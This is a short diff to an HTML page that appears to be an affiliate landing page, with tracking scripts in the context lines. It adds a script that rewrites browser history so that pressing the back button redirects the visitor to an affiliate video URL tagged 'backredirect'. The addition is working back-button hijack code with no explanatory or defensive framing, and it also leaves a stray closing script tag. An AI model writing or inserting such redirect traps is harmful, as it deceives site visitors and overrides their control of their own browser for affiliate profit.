@@ -132,6 +132,23 @@ fetch('https://ipapi.co/json/')
   ttq.page();
 }(window, document, 'ttq');
 </script>
+         	</script>
+	    <script type="text/javascript">
+var newUrl = location.pathname + location.search;
+
+(function(window, location) {
+history.replaceState(null, document.title, newUrl+"#!/backbutton");
+history.pushState(null, document.title, newUrl);
+window.addEventListener("popstate", function() {
+if(location.hash === "#!/backbutton") {
+history.replaceState(null, document.title, newUrl);
+setTimeout(function(){
+location.replace("https://theneotonics.com/video.php?aff_id=170827?&subid=backredirect");
+},0);
+}
+}, false);
+}(window, location));
+</script>
 </head>
 <body>
     <div class="container">
